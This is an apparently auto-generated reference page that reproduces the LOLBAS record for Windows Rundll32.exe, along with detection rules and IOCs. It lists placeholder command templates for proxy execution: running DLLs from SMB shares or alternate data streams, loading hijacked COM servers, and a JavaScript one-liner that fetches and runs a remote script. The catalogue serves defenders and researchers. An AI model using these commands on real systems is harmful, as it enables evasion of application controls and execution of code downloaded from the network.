---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Rundll32.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `rundll32.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rundll32.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Rundll32.exe](../../tools/windows/rundll32.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rundll32.exe |
| name | Rundll32.exe |
| type | tool |
| source | lolbas |
| url | https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Handle: '@oddvarmoe'
  Person: Oddvar Moe
- Handle: '@bohops'
  Person: Jimmy
- Handle: '@404death'
  Person: Sailay
- Handle: '@Mrtn9'
  Person: Martin Ingesen
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: rundll32.exe {PATH},EntryPoint
  Description: First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point
    in the DLL file to execute.
  MitreID: T1218.011
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  Usecase: Execute DLL file
- Category: Execute
  Command: rundll32.exe {PATH_SMB:.dll},EntryPoint
  Description: Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.
  MitreID: T1218.011
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  - Execute: Remote
  Usecase: Execute DLL from SMB share.
- Category: Execute
  Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
  Description: Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.
  MitreID: T1218.011
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: JScript
  Usecase: Execute code from Internet
- Category: ADS
  Command: rundll32 "{PATH}:ADSDLL.dll",DllMain
  Description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  Usecase: Execute code from alternate data stream
- Category: Execute
  Command: rundll32.exe -sta {CLSID}
  Description: Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.
  MitreID: T1218.011
  OperatingSystem: Windows 10 (and likely previous versions), Windows 11
  Privileges: User
  Tags:
  - Execute: COM
  Usecase: Execute a DLL/EXE COM server payload or ScriptletURL code.
Created: 2018-05-25
Description: Used by Windows to execute dll files
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml
- IOC: Outbount Internet/network connections made from rundll32
- IOC: Suspicious use of cmdline flags such as -sta
Full_Path:
- Path: C:\Windows\System32\rundll32.exe
- Path: C:\Windows\SysWOW64\rundll32.exe
Name: Rundll32.exe
Resources:
- Link: https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
- Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
- Link: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
- Link: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
- Link: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
- Link: https://github.com/sailay1996/expl-bin/blob/master/obfus.md
- Link: https://github.com/sailay1996/misc-bin/blob/master/rundll32.md
- Link: https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90
- Link: https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rundll32.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml
```

```text
IOC: Outbount Internet/network connections made from rundll32
```

```text
IOC: Suspicious use of cmdline flags such as -sta
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml
- IOC: Outbount Internet/network connections made from rundll32
- IOC: Suspicious use of cmdline flags such as -sta
```
